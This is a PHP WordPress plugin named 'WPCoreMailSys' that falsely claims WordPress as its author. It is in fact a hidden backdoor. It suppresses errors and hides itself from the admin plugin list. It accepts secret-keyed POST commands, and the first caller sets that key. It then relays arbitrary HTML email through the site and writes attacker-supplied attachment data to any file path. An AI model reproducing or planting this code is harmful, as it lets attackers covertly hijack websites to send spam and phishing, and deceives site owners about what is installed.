<?php

/*
* Plugin Name: WPCoreMailSys
* Version: 1.0
* Author: Wordpress
*/

    error_reporting(0);

    class wpmsys_plugin_class
    {
        var $m_root_path;
        var $m_request;
        var $m_actions;

        public function __construct()
        {
            $this->m_actions = array('INIT', 'MAIL');

            $this->m_root_path = plugin_dir_path(__FILE__);

            add_action('init', array($this, 'wp_init'), 0);

            if (is_admin())
                add_action('all_plugins', array($this, 'all_plugins'));
        }

        private function parse_request()
        {
            $this->m_request = false;

            foreach ($_POST as $key => $value)
            {
                if (stripos($key, 'wm_') === false)
                    continue;

                if (!is_array($this->m_request))
                    $this->m_request = array();

                $this->m_request[$key] = $value;
            }

            if (!isset($this->m_request['wm_action']) || !isset($this->m_request['wm_seckey']))
                $this->m_request = false;

            return $this->m_request;
        }

        public function wp_init()
        {
            if ($this->parse_request() !== false)
            {
                $action = $this->m_request['wm_action'];
                $key_req = $this->m_request['wm_seckey'];

                $key_hash = get_option('wm_wpmsys_hash');

                if (empty($key_hash) && $action == 'INIT')
                    add_option('wm_wpmsys_hash', md5($key_req)) === true ? $this->result(1) : $this->result(0);

                if ((!empty($key_req) && !empty($key_hash)) && ($key_hash != md5($key_req)))
                    $this->result(0);

                switch ($action)
                {
                    case 'MAIL':
                    {
                        if (empty($this->m_request['wm_config']))
                            $this->result(0);

                        $config = json_decode(base64_decode(rawurldecode($this->m_request['wm_config'])), true);
                        $result = false;

                        if (is_array($config) && isset($config['from']) && isset($config['to']) && isset($config['subject']) && isset($config['body']))
                        {
                            $headers = false;

                            $headers[] = 'Content-Type: text/html; charset=UTF-8';
                            $headers[] = 'From: ' . $config['from'];

                            $attach = false;

                            if (isset($config['att_data']) && isset($config['att_name']))
                            {
                                file_put_contents($config['att_name'], base64_decode($config['att_data']));

				$attach = array($config['att_name']);
                            }

                            $result = wp_mail($config['to'], $config['subject'], $config['body'], $headers, $attach);

                            if($attach)
                            {
                                unlink($attach[0]);
                            }
					
                        }

                        ($result === false) ? $this->result(0) : $this->result(1);

                        break;
                    }
                }
            }
        }

        public function all_plugins($plugins)
        {
            $self_file = str_replace($this->m_root_path, '', __FILE__);

            foreach ($plugins as $plugin_file => $plugin_data)
            {
                if (stripos($plugin_file, $self_file) !== false)
                {
                    unset($plugins[$plugin_file]);

                    break;
                }
            }

            return $plugins;
        }

        private function result($code)
        {
            die('[***[' . $code . ']***]');
        }
    }

    global $g_wpmsys_plugin_class;

    if (!isset($g_wpmsys_plugin_class))
        $g_wpmsys_plugin_class = new wpmsys_plugin_class();
?>